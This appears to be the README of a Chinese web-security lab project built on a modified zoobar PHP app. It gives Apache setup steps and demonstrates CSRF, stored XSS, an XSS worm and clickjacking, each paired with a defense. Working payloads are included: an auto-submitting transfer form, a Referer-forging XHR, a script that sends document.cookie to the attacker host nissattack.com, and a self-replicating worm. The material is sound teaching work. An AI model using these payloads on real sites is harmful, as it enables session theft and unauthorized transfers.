# web 安全实践练习项目



web 安全实践实验项目，对其做了一些修改。

**修改内容**

* 支持php7.X 与 8.0.13；
* 对部分类、变量以及html标签的命名做了一些调整。
* 修改部分代码格式；
* 对部分安全性内容进行修改；

## 配置与运行

#### php配置

##### php mysql 配置

修改`/etc/php.ini`文件：

* 添加 mysqli 扩展，以支持mysql接口。

  > 在php.ini中添加：`extension mysqli`

其他mysql选项被定义在php.ini中的`MySQLi`段中，可自行修改：

![image-20211226180342034](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226180342034.png)

#### httpd/apache服务器配置

以httpd服务器为例子（较新版本的apache服务器）。

```bash
➜  ~ httpd -v       
Server version: Apache/2.4.51 (Unix)
Server built:   Nov 13 2021 20:10:37
```

修改 httpd 服务配置文件`/etc/httpd/conf/httpd.conf 
 `：

* 添加模块：

  ```htaccess
  LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
  ```
  貌似是为每个HTTP连接创建一个进程/线程？

* 删除模块（注释掉）：
  
  ```htaccess
  LoadModule mpm_event_module modules/mod_mpm_event.so
  ```

新建配置文件`httpd/conf/myconf/zoobar.conf`：

```htaccess
# 添加php模块，将文件移交给php处理后，将生成的html内容返回给客户端浏览器
LoadModule php_module /usr/lib/httpd/modules/libphp.so

<IfModule ssl_module>

    <Directory /files>
    Options Indexes FollowSymLinks
    </Directory>
    
    AddType application/x-httpd-php .php

	# zoobar web服务
	<VirtualHost niss.com:443>
		ServerAdmin nishoushun@ustc.edu
		ServerName niss.com	

        # 你的项目目录路径
		DocumentRoot /public/www/myzoo

                <IfModule php_module>
                  DirectoryIndex index.html index.htm index.php
                  PHPIniDir /etc/php/php.ini
                </IfModule>

		# 日志记录路径
		ErrorLog  /public/www/myzoo/logs/zoobar_err.log
		CustomLog /public/www/myzoo/logs/access.log combined

		SSLEngine on

		# 网站证书和私钥地址
		SSLCertificateFile    /home/niss/.secret/ca/certs/apache/apache_server.crt
		SSLCertificateKeyFile /home/niss/.secret/ca/certs/apache/serverkey.pem

		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>

	
	</VirtualHost>
</IfModule>

	# attack web服务
	<VirtualHost nissattack.com:80>
		ServerAdmin nishoushun@ustc.edu
		ServerName nissattack.com	
        DirectoryIndex index.html index.htm index.php
        
        # 你的项目目录路径
		DocumentRoot /public/www/attack

		# 日志记录路径
		ErrorLog  /public/www/attack/logs/error.log
		CustomLog /public/www/attack/logs/access.log combined
	</VirtualHost>
```

* httpd服务器将以`ServerName`进行区分发送至本地的请求，如果在本地需要修改hosts文件。（其实可以通过端口号区分，只需要添加`listen` 指令，并将对应`VirtualHost`的端口号进行修改即可）。

将以上配置文件的各项进行相应修改，同时将该配置文件通过`include`指令添加进`/etc/httpd/conf/httpd.conf`中。

> 注意：在某些系统中，php8可能不自带`libphp.so`，需要自行安装，并导入该模块。

##### 数据库配置

1. 配置 mysql 或 mariaDB 数据库。
2. 执行`\sql\create.sql`。

## 项目配置

配置项位于：`项目根目录\includes\config.php`，此文件包含本项目用到的全局变量。

##### 数据库连接部分

修改数据库配置变量

```php
$DEFAULT_DB_NAME = "your database name";
$DEFAULT_DB_HOST = "your database server host";
$DEFAULT_DB_PASSWD = "your database user password";
$DEFAULT_DB_USER = "database user name";
```

##### 修改tag以及其他不安全字符过滤规则：

修改`includes\config.php`中的 `$allowd_tags` 以及 `$disallowed`，其中：

* `$allowd_tags`：允许出现在zoobar用户界面中的profile中的html tag；
* `$disallowd`：不允许出现的字符，会被替换为空格字符：`" "`；
* `$REPLACE_SPACIAL_CHAR`：若为`true`，则将一些特殊字符转义为`&xx`；

##### 开启Transfer安全检查：

修改：

```php
$ENABLE_HTTP_REFER_CHECK = true;
$ENABLE_TOKEN_CHECK = true;
```

* `$ENABLE_HTTP_REFERER_CHECK `：若为true，则检查请求来源是否为`/transfer.php`，不通过验证则php终止服务；
* `$ENABLE_TOKEN_CHECK `：若为true，用户访问transfer.php时进行token更新，并于用户提交的token相比较（token被写入到用户表单并不可见），不通过验证则php终止服务；

## 攻击演示

用于攻击演示，包含：

* `csrf.html`：包含一段自动提交转帐请求的js。

* `xssCookieGetter.html`：用于存储至zoobar用户的profile中，解析为js后，自动向attack服务的`cooker.php`发送一条请求，包含用户的cookie。

* `cooker.php`：接受请求并打印cookie（实际上没用，要获取cookie，只需要查看配置问attack访问日志就可以）：

  ![image-20211221210534047](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211221210534047.png)

* `xssworm.html`：用于存储至zoobar用户的profile中，解析为js后，自动提交转交请求，并提交一个将用户profile 更新为本脚本内容的请求。

* `hijack.html`：点击劫持演示页面

> 注意：
>
> CSRF攻击演示需要将检查设为`false`：
>
> ```php
> $ENABLE_HTTP_REFER_CHECK = false;
> $ENABLE_TOKEN_CHECK = false;
> ```
>
> XSS攻击演示需要将允许的添加一些tag与关键词；
>
> XSS蠕虫攻击也需要将CSRF检查设为`false`

### csrf

hacker 在自己的profile中设置：

```html
<a href="http://nissattack.com/csrf.html">click me to win iphone</a>          
```

浏览器将其解析为html链接：

![image-20211226182515431](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226182515431.png)

普通用户点击进入`nissattack/csrf.html`，js会自动提交一个zoobar转移表单。

理论上可以通过以下代码自动发送一个转帐请求：

```js
const req = new XMLHttpRequest();
req.withCredentials = true;
req.open("POST","https://niss.com/transfer.php",false);
req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
req.send("zoobars=1&recipient=hacker&submission=Send");
alert("YOU WIN");
```

但是实际上因为同源策略，httpd服务器会禁止该请求：

![image-20211226182846492](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226182846492.png)

所以需要通过提交表单的方式完成本次攻击：

```bash
<form method="POST"
      action="https://niss.com/transfer.php"
      target="it"
      id="transfer-form">

    <!--  默认一个zoobar-->
    <input name="zoobars" type="text" value="1" size="5">
    <input name="recipient" type="text" value="hacker">
    <input type="hidden" name="submission" value="Send">
</form>

<script type="text/javascript">
    // 自动提交表单
    form = document.getElementById("transfer-form");
    form.submit();
    alert("CONGRATULATION!!! YOU WIN")
</script>
```

> 其实去除表单中的`id="transfer-form"` 也会失败，不知道为什么🙃🙃🙃🙃

#### 防御

##### HTTP_REFERER

从日志中可以看出，所有的transfer来源为：`transfer.php`：

```
127.0.0.1 - - [26/Dec/2021:18:40:53 +0800] "POST /transfer.php HTTP/1.1" 200 1874 "https://niss.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
```

php可以使用http_referer获取请求来源页面，判定是否为`/transfer.php`，如果不是在停止服务。

> http referer 值被保存在http请求报文头中的 `Referer` 字段中

demo：

```php
function checkHttpReferer(){
    $request_from = "https://niss.com/transfer.php";
    $fromPage = $_SERVER['HTTP_REFERER'];
    if($fromPage == $request_from ){
        return;
    }
    $result = "Transfer failed: post from wrong page.";
    echo $result."<br>";
    // 直接退出
    exit(1);
}
```

但是HTTP_REFERER可以被轻松修改，例如使用bp抓取报文，可以轻松修改该值：

![image-20211226184959116](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226184959116.png)

从日志记录可以看出，php将其认为其来源为`https://niss.com/transfer.php`：

```bash
127.0.0.1 - - [26/Dec/2021:18:51:16 +0800] "POST /transfer.php HTTP/1.1" 200 1866 "https://niss.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
```

通过结果来看攻击也确实成功了。

其实讲到这，可以将上述csrf.html代码修改为以下内容，同样可以达到效果：

```js
<script type="text/javascript">
    const req = new XMLHttpRequest();
    req.withCredentials = true;
    req.open("POST","https://niss.com/transfer.php",false);
	// 修改 Referer
    req.setRequestHeader("Referer","https://niss.com/transfer.php")
    req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    req.send("zoobars=1&recipient=hacker&submission=Send");
    alert("YOU WIN");
</script>
```

具体代码改动看：`transfer.php`

##### Token

抵御CSRF的办法一般就是找一个只有正常用户知道并可以提交，而hacker是无法得之的值。

每次用户等录页面时，可以生成一个随机值转为token，并保存之session中；之后用户每访问`transfer.php`页面，则在表单中自动填入token，并一并发送至服务端，而其他人无法得知该token，也就无法自动提交token信息来完成认证。

> 注意：每次用户logout后要销毁session，防止每次login都用的同一个token
>
> 要将`"Content-type"`设为`"application/x-www-form-urlencoded"`以便于服务端识别POST参数。

具体代码改动看：`transfer.php` 与 `userAuth.php#UserAuth#logout`

### XSS注入

#### 存储型

##### cookie窃取

xsser将以下代码存储在profile中：

```js
<h1>HEllO-+___++___+</h1>

<script>
  window.open("http://nissattack.com/cooker.php?cookie="+document.cookie)
</script>
```

普通用户点击后自动发送一个包含本页面cookie的请求至攻击者页面。

在nissattack.com网站的日志记录中可以看到,cookie被窃取：

```bash
127.0.0.1 - - [26/Dec/2021:20:16:16 +0800] "GET /cooker.php?cookie=PHPSESSID=t4bjul4eclvpib482fu3vitg7h;%20ZoobarLogin=YToyOntpOjA7czo1OiJ4c3NlciI7aToxO3M6MzI6ImQ5MDZhYzcwY2M0NmQ5MGZmODUzNjg3NDg1NDg5NDJjIjt9 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"

```

##### XSS蠕虫

普通用户访问hacker的页面并触发js，该js进行攻击，并将本身代码写入到被攻击者的页面中并被存储。其他人访问该页面同样遭到xss攻击。

在xssworm.html中：

```html
<!--xss 蠕虫，将其存入user profile中生效-->
<span id="xssworm-span">
    <script>
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","https://niss.com/transfer.php",false);
        req.setRequestHeader("Referer","https://niss.com/transfer.php")
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        // 提交请求，为 xsswormer 转一个zoobar
        xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");

        // 提交profile更新请求
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","https://niss.com/index.php",true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        // 读取本块元素内容 ==> str
        str = "<span id=xssworm-span>"
        str += document.getElementById("xssworm-span").innerHTML + "</span>";
        str = encodeURIComponent(str);
        // 将其保存至被攻击者的 profile中
        str = "profile_submit=Save&profile_update=" + str;
        xmlhttp.send(str);
    </script>
</span>
```

该代码首先发送一个转移请求，然后读取代码内容（连带标签）发送一个 profile 更新请求。

#### 防御

在输出html时，仅使用信任的tag，对一些可能有威胁的标tag符或标签进行替换。

> 比如使用 `&lt` 替换 `<`

demo：

```php
$profile = preg_replace("/</i", "&lt", $profile);
$profile = preg_replace("/>/i", "&gt", $profile);
```

> 其实php中提供了该功能函数 `htmlentities($string)`
>
> 该函数将特殊字符转义为普通字符，从而并不会被浏览器解析为tag

![image-20211226200748929](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226200748929.png)

具体代码改动看：`users.php`

### 点击劫持

通过`iframe`在其他网站中包含zoobar transfer.php页面，利用css将iframe内容调成透明，并且诱导用户在`Send` 按钮的位置点击。

> 由于是iframe引入transfer.php界面，所以用户点击了按钮后的效果与在zoobar网站上点击效果完全一致。

hijacker在自己的profile中添加：

```html
<a href="http://nissattack.com/hijack.html">win</a>    
```

用户点击进入后会看到（为了方便演示，此时的透明度为50%）：

![image-20211226204019788](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226204019788.png)

用户只需要向`win`的位置进行点击，即用户自己点击了send按钮。

> 但实际上表单中并没有内容，此次攻击无效🙃🙃🙃🙃🙃

#### 防御

##### X-Frame-Options

The **`X-Frame-Options`** [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 响应头是用来给浏览器 指示允许一个页面可否在`<frame>`，`<iframe>` ，`<embed>`，`<object>`，中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免clickjacking 攻击。

`X-Frame-Options` 有三个可能的值：

* `deny`:表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。

* `sameorigin`：表示该页面可以在相同域名页面的 frame 中展示。

* `allow-from *uri*`：表示该页面可以在指定来源的 frame 中展示。

```
X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://example.com/
```

> 说到底还是得用户自觉一点儿。

检查httpd配置中是否包含headers模块，没有就导入进来：

```htaccess
LoadModule headers_module modules/mod_headers.so
```

开启X-Frame-Options，在自定义配置文件中添加：

```htaccess
<IfModule headers_module>
    Header always set X-Frame-Options "sameorigin"
</IfModule>
```

![image-20211226210721233](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226210721233.png)

关于X-Frame-Options可以参考[X-Frame-Options](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options)
